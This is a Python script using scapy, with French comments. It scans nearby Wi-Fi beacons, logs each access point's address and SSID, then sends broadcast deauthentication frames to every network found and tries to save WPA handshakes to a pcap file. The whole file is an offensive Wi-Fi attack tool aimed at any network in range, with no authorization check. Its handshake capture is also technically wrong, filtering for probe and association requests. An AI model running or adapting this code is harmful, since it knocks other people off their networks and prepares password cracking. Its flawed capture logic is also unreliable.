import os
import time
import logging
from scapy.all import *

# Configuration du logging
logging.basicConfig(level=logging.INFO)

# Définir l'interface à utiliser (e.g. wlan0, wlan1, etc.)
interface = "wlan1"  # Remplacez par votre interface réseau Wi-Fi

def scan_wifi():
    logging.info("Début du scan des réseaux Wi-Fi...")
    packets = sniff(iface=interface, count=100, timeout=10)

    networks = []
    for packet in packets:
        if packet.haslayer(Dot11Beacon):
            mac_address = packet[Dot11].addr3
            ssid = None
            for elt in packet[Dot11Elt]:
                if elt.ID == 0:
                    ssid = elt.info.decode("utf-8")
                    break
            networks.append((mac_address, ssid))

    with open("networks.txt", "w") as f:
        for network in networks:
            f.write(f"{network[0]} - {network[1]}\n")

    logging.info("Scan des réseaux Wi-Fi terminé.")
    return networks

def capture_handshake(ap_address):
    logging.info(f"Capture du handshake pour {ap_address}...")
    # Sniffer pour capturer le handshake
    packets = sniff(iface=interface, filter="type mgt subtype probe-req or type mgt subtype assoc-req", count=10, timeout=30)
    
    # Sauvegarder le handshake dans un fichier
    with open("handshake.pcap", "wb") as f:
        wrpcap(f, packets)

    logging.info("Handshake capturé et sauvegardé dans handshake.pcap.")

def deauth_attack(ap_address):
    packet = RadioTap() / Dot11(type=0, subtype=12, addr1="ff:ff:ff:ff:ff:ff", addr2=ap_address, addr3=ap_address) / Dot11Deauth(reason=7)
    
    for _ in range(10):  # Attaque pendant 10 secondes
        sendp(packet, iface=interface, verbose=0)
        logging.info(f"Paquet de désauthentification envoyé à {ap_address}")
        time.sleep(1)

if __name__ == "__main__":
    networks = scan_wifi()

    with open("networks.txt", "r") as f:
        for line in f:
            mac_address = line.split(" - ")[0]
            logging.info(f"Démarrage de l'attaque de désauthentification sur {mac_address}")
            deauth_attack(mac_address)
            capture_handshake(mac_address)  # Capturer le handshake avant de passer à l'adresse suivante
